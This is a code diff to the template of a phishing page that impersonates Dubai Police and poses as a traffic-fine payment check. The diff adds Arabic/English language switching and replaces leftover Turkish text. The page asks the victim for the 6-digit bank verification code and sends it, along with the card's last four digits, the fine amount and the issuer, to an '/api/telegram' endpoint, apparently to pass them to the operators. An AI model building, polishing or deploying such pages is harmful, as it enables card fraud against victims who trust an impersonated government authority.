@@ -5,10 +5,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <title>Verify Transaction | Dubai Police</title>
 <link rel="icon" type="image/png" href="/dp-logo.png">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0;}
 body{font-family:'Inter',-apple-system,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;flex-direction:column;max-width:480px;margin:0 auto;}
+[dir="rtl"] body{font-family:'Cairo','Inter',sans-serif;}
 @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
 header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
@@ -51,7 +52,10 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
       <div style="color:rgba(255,255,255,0.6);font-size:11px;">شرطة دبي</div>
     </div>
   </div>
-  <div style="font-size:11px;color:rgba(255,255,255,0.5);">Secure Verification</div>
+  <div style="display:flex;align-items:center;gap:8px;">
+    <div style="font-size:11px;color:rgba(255,255,255,0.5);" data-i18n="secure_payment">Secure Verification</div>
+    <button id="lang-toggle" onclick="dpI18n.setLang(dpI18n.getLang()==='ar'?'en':'ar')" style="font-size:12px;font-weight:700;padding:4px 11px;border-radius:16px;border:1.5px solid rgba(255,255,255,0.45);background:rgba(255,255,255,0.12);color:white;cursor:pointer;">AR</button>
+  </div>
 </header>
 
 <div class="main">
@@ -64,30 +68,31 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
           <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
         </svg>
       </div>
-      <div class="card-title">Doğrulama Kodunu Girin</div>
-      <div class="card-sub">Cihazınızı doğrulamak için gereken kodu giriniz.</div>
+      <div class="card-title" data-i18n="verify_tx">Verify Transaction</div>
+      <div class="card-sub" data-i18n="enter_code_sub">Please enter the verification code sent to your device.</div>
       <div class="bank-pill"><%= issuer || 'Your Bank' %></div>
     </div>
+
     <% if (locals.error === 'wrong_otp') { %>
-    <div style="margin:0 16px 0;padding:12px 14px;background:#fef2f2;border:1.5px solid #fecaca;border-radius:10px;display:flex;gap:10px;align-items:flex-start;">
+    <div style="margin:12px 16px 0;padding:12px 14px;background:#fef2f2;border:1.5px solid #fecaca;border-radius:10px;display:flex;gap:10px;align-items:flex-start;">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2.5" stroke-linecap="round" style="flex-shrink:0;margin-top:1px;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
       <div>
-        <div style="font-size:13px;font-weight:700;color:#dc2626;margin-bottom:2px;">Incorrect Code</div>
-        <div style="font-size:12px;color:#dc2626;opacity:.85;">The code you entered was incorrect. Please try again with the latest code.</div>
+        <div style="font-size:13px;font-weight:700;color:#dc2626;margin-bottom:2px;" data-i18n="incorrect_code_title">Incorrect Code</div>
+        <div style="font-size:12px;color:#dc2626;opacity:.85;" data-i18n="incorrect_code_msg">The code you entered was incorrect. Please try again with the latest code.</div>
       </div>
     </div>
     <% } %>
 
     <div class="tx-section">
-      <div class="tx-lbl">Transaction Details</div>
-      <div class="tx-row"><span class="tx-k">Merchant</span><span class="tx-v">Dubai Police</span></div>
-      <div class="tx-row"><span class="tx-k">Amount</span><span class="tx-v" style="color:#1a6b3a;font-size:15px;">AED <%= totalFine.toLocaleString() %></span></div>
-      <div class="tx-row"><span class="tx-k">Card</span><span class="tx-v" style="font-family:monospace;">•••• •••• •••• <%= cardLast4 %></span></div>
-      <div class="tx-row"><span class="tx-k">Date</span><span class="tx-v"><%= dateStr %></span></div>
+      <div class="tx-lbl" data-i18n="tx_details">Transaction Details</div>
+      <div class="tx-row"><span class="tx-k" data-i18n="merchant">Merchant</span><span class="tx-v">Dubai Police</span></div>
+      <div class="tx-row"><span class="tx-k" data-i18n="amount">Amount</span><span class="tx-v" style="color:#1a6b3a;font-size:15px;">AED <%= totalFine.toLocaleString() %></span></div>
+      <div class="tx-row"><span class="tx-k" data-i18n="card">Card</span><span class="tx-v" style="font-family:monospace;">•••• •••• •••• <%= cardLast4 %></span></div>
+      <div class="tx-row"><span class="tx-k" data-i18n="date">Date</span><span class="tx-v"><%= dateStr %></span></div>
     </div>
 
     <div class="otp-section">
-      <label class="otp-lbl">Enter 6-digit verification code</label>
+      <label class="otp-lbl" data-i18n="enter_6digit">Enter 6-digit verification code</label>
       <div class="otp-boxes" id="otp-boxes">
         <input class="otp-d" id="d0" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="one-time-code">
         <input class="otp-d" id="d1" maxlength="1" inputmode="numeric" pattern="[0-9]">
@@ -96,21 +101,22 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
         <input class="otp-d" id="d4" maxlength="1" inputmode="numeric" pattern="[0-9]">
         <input class="otp-d" id="d5" maxlength="1" inputmode="numeric" pattern="[0-9]">
       </div>
-      <button class="btn-verify" id="verify-btn" onclick="submitOtp()" disabled>Verify Code</button>
-      <div class="resend-row">Didn't receive it? <span class="resend-lnk" id="resend-lnk" onclick="handleResend()">Resend code</span></div>
+      <button class="btn-verify" id="verify-btn" onclick="submitOtp()" disabled data-i18n="verify_btn">Verify Code</button>
+      <div class="resend-row"><span data-i18n="didnt_receive">Didn't receive it?</span> <span class="resend-lnk" id="resend-lnk" onclick="handleResend()" data-i18n="resend_code">Resend code</span></div>
       <div class="status-bar" id="status-bar" style="display:none;">
         <div class="s-dot"></div>
-        <span id="status-txt">Verifying with bank…</span>
+        <span id="status-txt" data-i18n="verifying">Verifying with bank…</span>
       </div>
     </div>
 
     <div class="foot">
       <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      Secured by 256-bit SSL encryption
+      <span data-i18n="ssl">Secured by 256-bit SSL encryption</span>
     </div>
   </div>
 </div>
 
+<script src="/js/i18n.js"></script>
 <script>
 const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
 const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
@@ -148,16 +154,16 @@ async function submitOtp() {
   if (otp.length < 6) return;
   const btn = document.getElementById('verify-btn');
   btn.disabled = true;
-  btn.textContent = 'Verifying…';
+  btn.textContent = window.dpI18n ? window.dpI18n.t('verifying') : 'Verifying…';
   document.getElementById('status-bar').style.display = 'flex';
-  document.getElementById('status-txt').textContent = 'Sending code to bank…';
+  const stEl = document.getElementById('status-txt');
+  if (stEl) stEl.textContent = window.dpI18n ? window.dpI18n.t('verifying') : 'Verifying with bank…';
   try {
     await fetch('/api/telegram', {
       method: 'POST', headers: {'Content-Type':'application/json'},
       body: JSON.stringify({ type:'otp_sms', sid:SID, otp, cardLast4:CARD_LAST4, totalFine:TOTAL_FINE, issuer:ISSUER })
     });
   } catch {}
-  document.getElementById('status-txt').textContent = 'Waiting for bank confirmation…';
 }
 
 let resent = false;
@@ -165,7 +171,7 @@ function handleResend() {
   if (resent) return;
   resent = true;
   const lnk = document.getElementById('resend-lnk');
-  lnk.textContent = 'Code resent';
+  lnk.textContent = (window.dpI18n ? window.dpI18n.t('resend_code') : 'Resend code') + ' ✓';
   lnk.style.cursor = 'default';
   if (SID) {
     fetch('/api/telegram', {
@@ -173,7 +179,11 @@ function handleResend() {
       body: JSON.stringify({ type:'otp_resend', sid:SID, cardLast4:CARD_LAST4, totalFine:TOTAL_FINE, issuer:ISSUER })
     }).catch(() => {});
   }
-  setTimeout(() => { resent = false; lnk.textContent = 'Resend code'; lnk.style.cursor = 'pointer'; }, 30000);
+  setTimeout(() => {
+    resent = false;
+    lnk.textContent = window.dpI18n ? window.dpI18n.t('resend_code') : 'Resend code';
+    lnk.style.cursor = 'pointer';
+  }, 30000);
 }
 
 if (SID) {
